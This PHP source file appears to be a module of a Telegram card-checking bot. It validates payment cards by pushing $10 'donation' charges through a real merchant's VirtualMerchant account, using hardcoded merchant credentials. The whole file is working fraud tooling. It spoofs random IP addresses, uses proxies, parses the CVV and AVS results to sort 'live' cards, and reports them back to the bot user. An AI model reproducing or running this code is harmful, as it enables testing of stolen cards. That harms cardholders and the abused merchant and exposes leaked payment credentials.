<?php

use App\Models\Bot;
use App\Gate\{CurlX, Make, Responses as Res};
use App\Faker\Address;

$ccs = $ccs[0];
$cc  = $ccs['cc'];
$user['ida'] = Bot::SendMsg($user['chat_id'], "<b>Gate <u>".$gate['name']."</u> <i>started</i>♻️\nCard: <code>".implode('|', $cc)."</code>\nTime:</b> <i>".Make::Took()."'s</i>", $user['msg_id'])['result']['message_id'];

$ip1 = rand(1,255).'.'.rand(1,255).'.'.rand(1,255).'.'.rand(1,255);
$mip = rand(1,255).'.'.rand(1,255).'.'.rand(1,255).'.'.rand(1,255);
$cc[2] = substr($cc[2], -2);
$cookie = rand();

# -- REQ 1 -- #
$headers1 =['Host: www.myvirtualmerchant.com', 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3', 'Content-Type: application/x-www-form-urlencoded', 'Connection: keep-alive', 'Upgrade-Insecure-Requests: 1'];
$post1 = 'ssl_merchant_id=692560&ssl_user_id=pdxwebpage&ssl_pin=MXB59YUHTBLYWM2ZNLO0YDUA1804MMFWMKIP53IHPUAY7OJ1DB8T313N6C9WKADG&ssl_show_form=true&ssl_amount=10&ssl_country=USA&ssl_cvv2cvc2_indicator=1&ssl_transaction_type=ccsale&ssl_description=Donation+to+PPD+GirlStrength+program&ssl_cardholder_ip=' . $ip1;
$req1 = Make::Create(1, ['url' => 'https://www.myvirtualmerchant.com/VirtualMerchant/process.do', 'method' => 'POST', 'post' => $post1, 'headers' => $headers1, 'cookie' => $cookie, 'proxy' => $proxy2], $gate, $user);
IsUnspam($req1, $user);

$sessionId = Make::Analize($req1->body, '/html/body/form[1]/input[49]/@value')[0];
Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Wait(2, implode('|', $cc), $gate['name'], $lang['wait']));

# -- REQ 1 -- #
$headers2 = ['Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection: keep-alive', 'Content-Type: application/x-www-form-urlencoded', 'Host: www.myvirtualmerchant.com', 'Origin: https://www.myvirtualmerchant.com', 'Referer: https://www.myvirtualmerchant.com/VirtualMerchant/process.do', 'Upgrade-Insecure-Requests: 1'];
$post2 = 'hdnfld_permissionDescription=creditcard.sale&ssl_data_from_card_mgr=null&ssl_paypal_credit=null&hdnfld_paypal_token=&hdnfld_paypal_executepayment=&ssl_check_image=null&hdnfld_cardinputtype=keyed&ssl_pin_block=null&ssl_dukpt=null&ssl_mac_value=null&ssl_processing_code=null&ssl_sys_trace_audit_number=null&ssl_transaction_type=CCSALE&ssl_mag_data=null&ssl_partial_auth_indicator=null&hdnfld_sessionId='.$sessionId.'&hdnfld_old_sessionId=null&hdnfld_checktype=null&hdnfld_DelayedCardInput=Y&hdnfld_exp_date=null&hdnfld_security_code=null&hdnfld_cvv2_Data=null&ssl_merchant_ip='.$mip.'&ssl_ecs_product_code=null&ssl_cardholder_ip='.$ip1.'&tls_vers=&source_ip='.$ip1.'&dispatchMethod=processTransaction&dcc=&hdnfld_masterpass_lightbox_param=&hdnfld_masterpass_version=&ssl_vendor_id=&ssl_vendor_app_name=&ssl_vendor_app_version=&ssl_client_api_source=&ssl_client_api_source_version=&ssl_client_api_platform=&ssl_client_api_platform_version=&ssl_pos_mode=&ssl_entry_mode=&ssl_currency_code=&hdnfld_visacheckout_lightbox_param=&visaCheckoutRsp=&vicallId=&hdnfld_market=I&ssl_product_string=null&ewallet_txn_id=&ssl_card_short_description=&sessionId='.$sessionId.'&ssl_show_form=TRUE&ssl_partner_app_id=01&hdnfld_mac_key=&hdnfld_pin_working_key=&ssl_account_data_original='.$cc[0].'&ssl_bin_short_desc=&ssl_custom_data=+&ssl_mag_data=&ssl_account_data='.$cc[0].'&ssl_exp_date='.$cc[1].''.$cc[2].'&ssl_cvv2cvc2_indicator=&ssl_cvv2cvc2='.$cc[3].'&ssl_amount=10.00&ssl_customer_code=&ssl_salestax=&ssl_invoice_number=&ssl_credit_surcharge_amount=&ssl_description=Donation+to+PPD+GirlStrength+program&ssl_xid=&ssl_3dsecure_value=&ssl_eci_ind=&ssl_cardholder_ip='.$ip1.'&ssl_mobile_id=&ssl_merchant_ip='.$mip.'&ssl_recurring_flag=&ssl_payment_number=&ssl_payment_count=&ssl_bin_no=&ssl_merchant_txn_id=&ssl_company=&ssl_first_name=&ssl_last_name=&ssl_avs_address=ST+71&ssl_address2=&ssl_city=&ssl_state=&ssl_avs_zip='.Address::zip().'&ssl_country=USA&ssl_phone=&ssl_email=&ssl_ship_to_company=&ssl_ship_to_first_name=&ssl_ship_to_last_name=&ssl_ship_to_address1=&ssl_ship_to_address2=&ssl_ship_to_city=&ssl_ship_to_state=&ssl_ship_to_zip=&ssl_ship_to_country=&ssl_ship_to_phone=&hdnfld_reqdfields=ssl_account_data%3AR%3Bssl_exp_date%3AR%3Bssl_cvv2cvc2%3AR%3Bssl_amount%3AR%3Bssl_description%3ANR%3Bssl_first_name%3ANR%3Bssl_last_name%3ANR%3Bssl_avs_address%3AR%3Bssl_address2%3ANR%3Bssl_city%3ANR%3Bssl_state%3ANR%3Bssl_avs_zip%3AR%3Bssl_country%3ANR%3Bssl_phone%3ANR%3Bssl_email%3ANR%3B&hdnfld_markup=&ssl_add_token=&ssl_3ds=&ssl_bypass_3ds=';
$req2 = Make::Create(2, ['url' => 'https://www.myvirtualmerchant.com/VirtualMerchant/process.do', 'method' => 'POST', 'post' => $post2, 'headers' => $headers2, 'cookie' => $cookie, 'proxy' => $proxy2], $gate, $user);
IsUnspam($req1, $user);

$cvvres = CurlX::ParseString($req2->body, '<input type="hidden" name="ssl_cvv2_response" value="', '"></td>');
$avsres = CurlX::ParseString($req2->body, '<input type="hidden" name="ssl_avs_response" value="', '"></td>');
$msgres = Make::Analize($req2->body, '//*[@id="ssl_result_message"]')[0];

Res::SetParams($msgres, null, $avsres, $cvvres, $req2->body);
$res = Res::Cpay();
print_r(['res' => $res, 'msg' => $msgres, 'avs' => $avsres, 'cvv' => $cvvres]);

Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Parse($lang['final'], $user, implode('|', $cc), $res, $ccs['bin'], $gate['name']));

try {
    $live = Make::SaveLive($res['live'], $user['id'], implode('|', $cc), $gate['name'], $res, $ccs['bin']);
} catch (\Exception $e) {
    error_log($e->getMessage());
    echo $e->getMessage();
}